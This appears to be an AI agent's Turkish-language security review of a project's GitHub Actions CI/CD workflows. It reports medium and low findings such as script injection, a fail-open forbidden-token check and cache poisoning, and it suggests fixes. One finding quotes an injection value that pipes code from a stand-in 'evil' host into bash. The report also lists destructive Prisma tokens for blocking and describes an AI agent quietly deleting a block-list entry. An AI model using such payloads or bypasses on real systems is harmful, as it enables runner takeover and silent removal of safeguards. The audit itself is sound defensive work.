# T-003 — `security` gate, tur 1

- **Tarih:** 2026-10-27
- **Sürüm:** ROADMAP v0.0.12
- **Dal:** `chore/ajan-altyapisi` (değişiklikler commit edilmemiş)
- **Yüzey:** CI/CD iş akışları + composite action'lar + `scripts/sync-platform-version.ts`
  - yapılandırma düzeltmeleri. Çalışma zamanı kod yolu değişmedi.

```
GATE: security
SONUÇ: PASS
```

FAIL kuralı (AGENT_BASELINE §4): 0 critical, 0 high, **2 medium**, 4 low →
1–2 medium = **PASS**, bulgular teknik borca kaydedilir.

---

## BULGULAR

### [SEV: medium] `.github/actions/run-gates/action.yml:29,33,38,42`

`${{ inputs.filter }}` **`run:` bloğunun içinde** dört kez geçiyor:

```yaml
run: pnpm exec turbo run lint --filter="${{ inputs.filter }}"
```

Task'ın "Üretim Fazı Sonuçları" bölümü (madde 2) _"Final hâlde `run:` içinde **sıfır**
ifade (satır satır denetlendi)"_ diyor — bu iddia **yalnızca `ci.yml` için** doğru;
composite action denetlenmemiş. `ci.yml` ve `release.yml` gerçekten temiz (doğrulandı:
`env:`/`with:`/`if:`/`outputs:` dışında tek bir ifade yok).

**Saldırı senaryosu:** Bugün **sömürülebilir değil** — beş çağrı yerinin hepsi
(`ci.yml:433,456,473,490,514`) iş akışı dosyasının kendi literal değerlerini geçiyor
(`'@arkesoft/api...'`, `'./packages/*'`). Risk gelecekte somutlaşır: `run-gates`
Task'ın kendi sözleşmesinde **beşli kapının tek tanım yeri ve additive büyüme noktası**
olarak ilan edildi. Bir sonraki katkıcı buraya `filter:` değerini olay verisinden
besleyen bir çağrı eklediğinde (ör. PR etiketi/dal adı ile hat seçimi), saldırgan
`x" ; curl -s https://evil/sh | bash ; echo "` değeriyle runner'da doğrudan komut
çalıştırır — `${{ }}` bash tırnakları görmeden **metinsel olarak** yerine konur, çift
tırnak korumaz. İkincil sorun: dosyanın kendi yorumunun _"mekanik grep ile
doğrulanabilir olsun diye bilinçli"_ dediği kural için **`guards`'ta hiçbir kontrol
yok** — bu yüzden ihlal zaten sessizce içeri girdi.

**Önerilen düzeltme:** `env: FILTER: ${{ inputs.filter }}` + `--filter="$FILTER"`
(aynısı `run-test` için gerekmiyor, o zaten `if:` içinde). Ayrıca `guards`'a
`.github/workflows/*.yml` **ve** `.github/actions/*/action.yml` üzerinde `run:` bloğu
içi ifade arayan bir adım ekle (kendi kendini eşlememesi için jeton yine iki parçadan
birleştirilsin — T3-5 dersi).

**Sorumlu ajan:** `devops`

---

### [SEV: medium] `.github/ci-forbidden-tokens.txt` + `.github/workflows/ci.yml:199-222`

Yasak jeton listesi bir **güvenlik/politika kontrolünün tek veri kaynağı**, ama üç
yönden korumasız:

1. **Pozitif öz-test fail-closed değil.** `ci.yml:210-211`:
   ```bash
   grep -nFf "$pattern_file" "$tokens_file" || echo '(beklenmeyen: eşleşme yok)'
   ```
   "R-6 kanıtı (1/2)" adımı eşleşme bulamazsa **yalnızca metin basıyor, exit 1
   vermiyor**. Liste boşaltılırsa ya da tüm satırlar yorum satırına çevrilirse
   `grep -Ff` boş desen dosyasıyla hiçbir şey eşlemez → **AC13 sessizce yeşil**.
2. **Dosyayı koruyan mekanizma yok.** Repoda hiçbir yerde `CODEOWNERS` yok
   (doğrulandı: `.github/`, kök, `docs/` — hiçbirinde).
3. **Liste, projenin asıl yasakladığı yıkıcı jetonları kapsamıyor.**
   `PRISMA_USER_CONSENT_FOR_DANGEROUS_AI_ACTION`, `migrate reset`,
   `db push --force-reset`, `--accept-data-loss` listede **yok** — bu jetonlar için
   `.github/**` altında hiçbir mekanik kontrol bulunmuyor. (Bugünkü durum temiz:
   grep ile dört jetonun hiçbiri iş akışlarında geçmiyor.)

**Saldırı senaryosu:** Bir katkıcı (veya bir AI ajanı) v0.0.16'ya ertelenmiş
`pnpm audit`'i CI'ya eklemek ister, `guards` kırmızı verir; onay istemek yerine
`.txt`'den o satırı siler. CI yeşile döner, kullanıcı kararıyla alınmış erteleme
**sessizce iptal olur** ve kimse fark etmez — çünkü kontrolün "liste gerçekten dolu mu"
kanıtı hata üretmiyor. Aynı hamle `TURBO_TOKEN`/`TURBO_TEAM` satırları için
yapıldığında uzaktan önbellek kimlik bilgilerinin iş akışına girmesinin önündeki tek
mekanik engel kalkar. İkinci senaryo: `devops` CI veritabanındaki şema sapmasını
"düzeltmek" için `prepare-db`'ye `--accept-data-loss` ekler; hiçbir kontrol uyarmaz,
desen sonraki iş akışlarına kopyalanır.

**Önerilen düzeltme:** (a) pozitif öz-testi fail-closed yap — desen sayısının beklenen
alt sınırın altına düşmesi ve/veya jeton dosyasının kendisinde eşleşme bulunmaması
`exit 1` üretsin; (b) dört yıkıcı Prisma jetonunu listeye ekle; (c) `.github/**` ve
`scripts/**` için `CODEOWNERS` ekle (ROADMAP'e kutu olarak düşülebilir).
Ek not: aynı adımdaki `printf ... | xargs grep -nFf` deseninde grep'in **hata** çıkışı
(ör. okunamayan dosya) ile "eşleşme yok" çıkışı ayırt edilmiyor — aynı düzeltmeyle
kapatılabilir.

**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/workflows/release.yml:72-86`

`tag` job'u `permissions: contents: write` beyan ediyor ama tek adımı bir `echo`.
Bugün `if: vars.ARKESOFT_RELEASE_TAGGING == 'true'` ile kapalı; repo değişkeni
açıldığı an **gerçek işi olmayan bir job yazma yetkili token ile `main` push'unda
koşar**. En az ayrıcalık ilkesi gereği izin, onu kullanan kod ile **aynı PR'da**
verilmeli.
**Düzeltme:** `permissions:` bloğunu şimdilik kaldır (veya `contents: read` yap);
gerçek etiketleme adımını ekleyen PR yükseltmeyi beraberinde getirsin.
**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/actions/setup-workspace/action.yml:41-47`

`.turbo` dizini `actions/cache@v4` ile gevşek önek anahtarıyla
(`restore-keys: turbo-${{ runner.os }}-`) geri yükleniyor ve `turbo.json`'da
`lint`/`typecheck`/`build` **önbelleklenebilir** (yalnızca `test` `cache: false`).
`.turbo` turbo'nun yerel içerik-adresli önbelleği; yerel önbellekte imza doğrulaması
yok.

**Saldırı senaryosu:** Katkıcı tek bir PR içinde iki push yapar. Birinci push'taki
`ci.yml` değişikliği, nihai (kötücül) kaynağın görev hash'leri için
(`turbo run lint --dry=json` bu hash'leri yazdırır) elle uydurulmuş
`.turbo/cache/<hash>.tar.zst` girdileri üretir; `actions/cache` bunu PR kapsamında
saklar. Ardından temiz görünen bir commit ile force-push yapılır: ikinci koşum zehirli
önbelleği geri yükler, turbo `lint`/`typecheck`/`build` için "cache hit" diyerek
komutları **hiç çalıştırmadan** başarılı sayar → `ci-gate` yeşil, kod aslında hiç
doğrulanmamıştır.
**Neden `low`, `medium` değil:** elle üretilmiş önbellek artefaktı + force-push
gerektiriyor, sır/yetki yükseltmesi sağlamıyor ve birleştirme hâlâ insan onayına bağlı;
turbo'nun içerik-adresli hash'lemesi **kazara** yanlış yeniden kullanımı zaten
engelliyor. (`test`'in `cache: false` olması bu vektörün en kritik ayağını ekibin
kendisi kapatmış.)
**Düzeltme seçenekleri:** gevşek `restore-keys` önekini kaldır, ya da `.turbo`'yu
önbelleğe alma (yalnızca pnpm store önbelleklensin), ya da kapı görevlerini
`TURBO_FORCE=1` ile koştur.
**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/workflows/ci.yml` (iş akışı geneli)

Dokuz job'un **hiçbirinde `timeout-minutes` yok** ve iş akışında `concurrency:` grubu
yok.
**Senaryo:** `api` job'undaki Postgres/Redis `services:` sağlık kontrolü asılırsa ya da
bir fork PR'ı kasıtlı olarak uzun koşan bir test eklerse job GitHub'ın **360 dakikalık**
varsayılanına kadar runner işgal eder; `concurrency` olmadığı için her push eskisini
iptal etmeden yeni bir tam matris başlatır → CI dakikalarının tüketilmesi / birleştirme
kuyruğunun kendi kendine DoS'u.
**Düzeltme:** job başına `timeout-minutes` (ör. 20, `api` için 30) +
`concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }`.
**Sorumlu ajan:** `devops`

---

### [SEV: low] `.github/workflows/release.yml:50`

`pnpm install --frozen-lockfile`, deponun **tek yazma yetkili** job'unda
(`contents: write` + `pull-requests: write` + `GITHUB_TOKEN`) koşuyor.
**Senaryo:** izin verilmiş bir build script'i (`prisma`, `@prisma/engines`) ele
geçirilirse postinstall `GITHUB_TOKEN`'ı ortamdan okuyup `main`'e yazabilir.
**Etki neden sınırlı:** pnpm 12 bağımlılık build script'lerini **varsayılan olarak
engelliyor** ve `pnpm-workspace.yaml`'daki `allowBuilds` haritası yalnızca o iki paketi
içeriyor — bu değişiklikle lock'a giren 28 yeni paket (`@changesets/cli@3.0.3` ağacı)
script çalıştıramaz. Yine de `version-pr` job'unun Prisma'ya hiç ihtiyacı yok.
**Düzeltme:** bu job'da `pnpm install --frozen-lockfile --ignore-scripts`.
**Sorumlu ajan:** `devops`

---

## PO'nun yedi inceleme kalemi — tek tek sonuç

| #   | Kalem                      | Sonuç                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| --- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Script injection           | **KISMİ** — `ci.yml` + `release.yml` **temiz** (0 ifade `run:` içinde; `EVENT_NAME`/`HEAD_SHA`/`PR_BASE_SHA`/`PUSH_BEFORE_SHA`/`BASE_REF`/`PR_BODY`/`NEEDS_JSON` hepsi `env:` üzerinden, tümü tırnaklı kullanılıyor). `run-gates/action.yml`'de 4 ihlal → medium bulgu                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| 2   | İzin en azlığı             | **GEÇTİ** (bir low ile) — `ci.yml` kökü `contents: read`, hiçbir job yükseltmiyor; `release.yml` kökü `contents: read`, yükseltme yalnızca `version-pr`'da. `write-all` / `id-token` / `packages: write` **yok**. `tag` job'unun gereksiz `contents: write`'ı → low                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| 3   | `pull_request_target`      | **GEÇTİ** — hiçbir iş akışında yok; üstelik `guards`'ta bölünmüş jetonla **mekanik** olarak yasaklanmış (`ci.yml:273-287`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 4   | Üçüncü taraf pinleme       | **GEÇTİ** — `changesets/action@a45c4d594aa4e2c509dc14a9f2b3b67ba3780d0d` tam **40 karakter** SHA (v1.9.0 yorumlu). `actionlint` bir `uses:` action'ı **değil**: resmî release tarball'ı + sabit `expected_sha256` + `sha256sum -c -` (`ci.yml:358-370`). Etiketle kullanılanlar yalnızca `actions/checkout@v4`, `actions/setup-node@v4`, `actions/cache@v4`, `pnpm/action-setup@v4` — talimata göre kabul edilebilir                                                                                                                                                                                                                                                                                                                                                                                                       |
| 5   | Sır sızması                | **GEÇTİ** — tek `secrets.*` referansı `release.yml:65`'teki `GITHUB_TOKEN` ve changesets/action için **gerekli**. `set -x` / `env` dökümü / `cat .env` / token `echo`'su **yok**. CI'daki Postgres kimlik bilgileri (`ci.yml:401-403`) ve `DATABASE_URL` (`ci.yml:318`) `.env.example:17-26` ile **birebir** aynı dev-only değerler — üretim kimlik bilgisi sızmamış. `.gitignore:7-9` `.env`'i kapsıyor, yeni `.changeset/.platform-notes.json` da eklenmiş; `git ls-files` → yalnızca `.env.example` izleniyor, `git status` → izlenen `.env` yok                                                                                                                                                                                                                                                                        |
| 6   | Guard atlatma              | **GEÇTİ** — `PRISMA_USER_CONSENT_FOR_DANGEROUS_AI_ACTION` / `migrate reset` / `force-reset` / `accept-data-loss` `.github/**` ve `scripts/**` altında **hiç geçmiyor** (tek eşleşme `packages/db/package.json:35`, zaten sarmalayıcı arkasında ve CI'dan çağrılmıyor). `prepare-db`'nin `db:deploy` kullanımı **gerekçeli ve doğru**: `prisma migrate deploy` ileri yönlü + idempotent, `run-guarded-prisma.ts` başlığında muafiyet açıkça yazılı; `migrate dev` olsaydı bulgu olurdu. `db:seed` **sarmalayıcıdan geçiyor** → `guard-policy.ts:46` host allowlist'i (`localhost`/`127.0.0.1`/`::1`) CI'da gerçekten egzersiz ediliyor. `container:` yasağı mekanik (`ci.yml:224-239`, bölünmüş jeton); `node-version:` yasağı mekanik (`ci.yml:241-257`)                                                                   |
| 7   | `sync-platform-version.ts` | **GEÇTİ** — kök `package.json`, `.changeset/config.json`, `.platform-notes.json` ve her workspace `package.json`'u **Zod ile parse ediliyor**; `JSON.parse` çıktısı önce `unknown`'a daraltılıyor (`readJsonUnknown`). `CHANGELOG` yazımı **fail-closed doğrulandı**: `runApply` sırası `insertChangelogEntry` (sentinel yoksa `throw`, satır 219-223) → **sonra** `updateRootVersion` (288) → `writeFileSync` (289) → `rmSync` (290); sentinel yoksa **üç yazmanın hiçbiri** gerçekleşmez. Path traversal **yok**: hem `readChangesetSummaries` hem `discoverWorkspacePackages` `readdirSync(..., {withFileTypes:true})` + `isFile()`/`isDirectory()` kullanıyor → yalnızca doğrudan çocuklar, isimde `/` olamaz, sembolik bağlar `isFile()` ile elenir. Tek `as` (satır 272) Zod `parse`'ından **bir satır sonra** (271) |

## "Ayrıca bak" kalemleri

- **`ci-forbidden-tokens.txt` koruması:** yok → yukarıdaki medium bulgu.
- **`plan` fail-open'ı:** güvenlik açısından **doğru yön** — şema/komut hatasında
  tüm hatlar koşar (fazla koşum, az değil) ve **sessiz değil**: `ci.yml:124-125`
  `GITHUB_STEP_SUMMARY`'ye "**fail-open devrede**" yazıyor. Bulgu değil.
- **`ci-gate` varsayılan-reddet:** **gerçekten varsayılan-reddet.**
  `case "$result" in success|skipped) ;; *) ok=false ;; esac` (`ci.yml:552-555`) —
  `failure`, `cancelled`, `timed_out` ve ileride eklenecek **her** yeni değer `exit 1`
  üretir. `contains(needs.*.result,'failure')` deseni **kullanılmamış** (dosyada hiç
  geçmiyor). Ayrıca `needs`'te olmayan bir job adı için `jq` `null` döndürür → yine
  `*)` dalına düşer. Bulgu değil. (`ci-gate.needs` listesinin mekanik doğrulaması
  olmaması zaten T3-4 olarak low borçta kayıtlı — tekrar raporlanmadı.)
- **`pnpm audit` CI'da yok:** talimat gereği bulgu yazılmadı. **`multer` kalemi ROADMAP'te
  hâlâ kayıtlı — doğrulandı:** `ROADMAP.md:1238` (A-A6, v0.0.4/v0.0.16) ve
  `ROADMAP.md:1317` (teknik borç tablosu, medium, sahip `devops`, vade v0.0.16,
  `pnpm.overrides` + beşli kapıya ekleme önerisiyle). Kaybolmamış.

## Tenant izolasyonu (CLAUDE.md §7, 14 madde)

Bu değişiklik **hiçbir tenant'a bağlı yüzeye dokunmuyor**: yeni tablo yok, migration
yok, tRPC prosedürü yok, kuyruk işi yok, önbellek anahtarı / S3 öneki / arama indeksi
yok, kullanıcıya dönük hata mesajı yok. 14 maddenin tamamı **uygulanamaz (N/A)**;
**karşılanmayan madde yok.**

Tek dolaylı temas: `prepare-db` CI'da `pnpm db:seed` koşuyor. Hedef, job ile birlikte
yok olan **geçici servis konteyneri** (`localhost:5432`) ve çağrı `run-guarded-prisma`
host allowlist'inden geçiyor → paylaşılan/üretim veritabanına erişim yolu yok, çapraz
tenant yüzeyi doğmuyor.

## ÖLÇÜMLER

- **`pnpm audit` (gerçekten koşturuldu):** `1 vulnerabilities found — Severity: 1 high`
  → **critical 0 · high 1 · moderate 0 · low 0**. Tek kalem `multer` (>=2.0.0 <2.5.0,
  GHSA-q7qp-rjg7-q26m), `@nestjs/platform-express` üzerinden 4 yolda geçişli.
  **Bu değişiklikten kaynaklanmıyor** (v0.0.4'ten devir, v0.0.16'ya kullanıcı kararıyla
  ertelenmiş, ROADMAP'te kayıtlı). Bu Task'ın lock'a eklediği **28 yeni paket
  (`@changesets/cli@3.0.3` + `zod@4.6.7` ağacı) sıfır yeni açık** getirdi.
- **İncelenen dosya:** 19 birincil (yüzeyin tamamı) + 7 referans
  (`turbo.json`, `.npmrc`, `.nvmrc`, `.env.example`, `packages/db/src/run-guarded-prisma.ts`,
  `packages/db/src/guard-policy.ts`, `ROADMAP.md`) = **26**.
- **Denenen saldırı vektörü:** **30** (ifade enjeksiyonu · `pull_request_target` ·
  izin yükseltme · `secrets.*` envanteri · action pinleme · `actionlint` tedarik zinciri ·
  sır dökümü · dev/prod kimlik bilgisi karşılaştırması · `.gitignore`+`git ls-files` ·
  4 yıkıcı Prisma jetonu · wrapper atlatma · host allowlist · 3 mekanik yasak kontrolü ·
  `ci-gate` varsayılan-reddet · `plan` fail-open · AC13 self-match · veri kaynağı koruması ·
  Zod kapsamı · fail-closed sırası · path traversal/symlink · `as` konumu ·
  prototype pollution · turbo cache zehirlenmesi · pnpm lifecycle politikası ·
  `pnpm audit` · lockfile kaynak denetimi · timeout/concurrency · PR şablonu).
- **Bulgu dağılımı:** critical **0** · high **0** · medium **2** · low **4**.
- **Karşılanmayan tenant izolasyon maddesi:** yok (14/14 N/A).
- **Çalıştırılmadı:** `gh` komutları (push/PR/workflow run — talimat gereği, ST-9
  Orkestratöre ait), gerçek runner üzerinde iş akışı koşumu, yıkıcı veritabanı komutu.
